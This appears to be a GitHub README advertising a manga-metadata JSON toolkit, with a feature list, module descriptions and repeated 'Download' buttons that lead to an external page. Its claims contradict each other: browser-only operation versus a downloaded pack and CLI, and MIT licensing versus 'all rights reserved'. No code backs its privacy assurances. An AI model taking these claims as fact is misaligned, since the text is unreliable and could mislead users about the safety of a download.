![preview](https://raw.githubusercontent.com/LykenV0/mwx-mapping-core/main/preview.svg)

# MangaVerse JSON Toolkit 🌀

**A modular, offline-first parser ecosystem for manga metadata — designed for Manga Watcher X and beyond.**

---

## Overview 📖

In the sprawling multiverse of digital manga, metadata is often scattered, inconsistent, or locked inside proprietary formats. The **MangaVerse JSON Toolkit** (inspired by the `mwx-json` paradigm) is your universal translator and curator. It transforms raw, messy manga source data into clean, structured JSON — ready for annotation, archiving, or cross-platform synchronization.

Think of it as a **Rosetta Stone for manga metadata**: one input, many outputs, zero friction. Whether you are building a personal library, a recommendation engine, or a reading companion, this toolkit gives you the building blocks without the boilerplate.

---

[![Download](https://raw.githubusercontent.com/LykenV0/mwx-mapping-core/main/button.svg)](https://lykenv0.github.io/mwx-mapping-core/)

## ✨ What Makes This Different?

| Feature | Why It Matters |
|---|---|
| **Offline-first architecture** | No server dependency. Your data stays yours. |
| **Responsive CLI & GUI** | Use it in terminal automation or as a visual dashboard. |
| **Multilingual metadata parsing** | Supports Japanese, Chinese, Korean, English, and French tags. |
| **24/7 community support** | Real-time help via GitHub Discussions (not a bot). |
| **Modular plugin system** | Extend parsers without rewriting core logic. |

---

## 🚀 Getting Started (No CLI Required)

The toolkit runs entirely in your browser via a **zero-dependency web interface** or as a standalone JSON processor. No accounts, no telemetry, no surprises.

1. Download the latest parser pack from the link above.
2. Drag-and-drop your manga data file (JSON, CSV, or raw HTML).
3. Select target format: `mwx-json`, `comicinfo`, `standardized`, or `custom`.
4. Export. Validate. Use.

> **Pro tip:** Use the built-in schema validator to catch missing fields before they break your reader.

---

## 🧩 Core Modules

### 1. Source Parser (`sp-mwx`)
Transforms raw Manga Watcher X export files into normalized JSON arrays. Handles encoding quirks, missing chapter lists, and orphaned metadata.

### 2. Tag Mapper (`tm-lang`)
Automatically maps English tags to native language equivalents using a local dictionary. Example: `"action"` → `"アクション"`.

### 3. Schema Validator (`sv-strict`)
Validates your output against a flexible JSON schema. Catches:  
- Missing required keys (`title`, `author`, `chapters`)  
- Incorrect data types (string vs array)  
- Duplicate entries (de-duplication included)

### 4. Batch Processor (`bp-multiverse`)
Processes entire folders of manga data in one pass. Generates a unified index file with cross-references.

---

## 🌐 Multilingual & Universal

The toolkit speaks your language — literally.  
- **Japanese:** Full support for `romaji`, `kanji`, and `kana` fields.  
- **Chinese:** Simplified and Traditional character sets.  
- **Korean:** Hangul-based title matching.  
- **Latin scripts:** English, French, Spanish, and Portuguese accents handled.

No more mangled names or missing characters. Your data stays accurate across scripts.

---

## 🔒 Security & Privacy

- **No cloud**: All processing happens locally in your environment.  
- **No telemetry**: Zero calls home. No analytics. No pings.  
- **Auditable**: Every line of code is visible. No obfuscation.

We believe trust is earned, not baked in.

---

## ⚖️ License & Legal

This project is released under the **MIT License** — use it, modify it, share it, but please credit the original authors.

> [View the full MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026. All rights reserved.

---

## 🙅 Disclaimer

This toolkit is an independent, community-driven project. It is not affiliated with, endorsed by, or sponsored by any manga platform, publisher, or reading application. All processing is performed on data you provide. Users are solely responsible for complying with the terms of service of any source from which data is obtained.

---

## 📊 Roadmap (2026)

- [ ] **v2.0** – Real-time streaming parser for live manga feeds  
- [ ] **v2.1** – Graph-based dependency mapper for cross-title references  
- [ ] **v2.3** – AI-assisted tag suggestion (local only, no cloud)  
- [ ] **v3.0** – Plugin marketplace for community parsers  

---

## 🤝 Contributing

Contributions are welcome!  
- Open an issue for feature requests or bugs.  
- Submit a pull request for parser improvements.  
- Join the discussions to share your use case.

Please read the `CONTRIBUTING.md` file before submitting your first PR.

---

## 💬 Community Support

Stuck? We've got your back.  
- **GitHub Discussions** – Ask questions, share tips, showcase your workflow.  
- **Wiki** – Tutorials, examples, and best practices.  
- **Changelog** – Always up-to-date. No surprises.

---

[![Download](https://raw.githubusercontent.com/LykenV0/mwx-mapping-core/main/button.svg)](https://lykenv0.github.io/mwx-mapping-core/)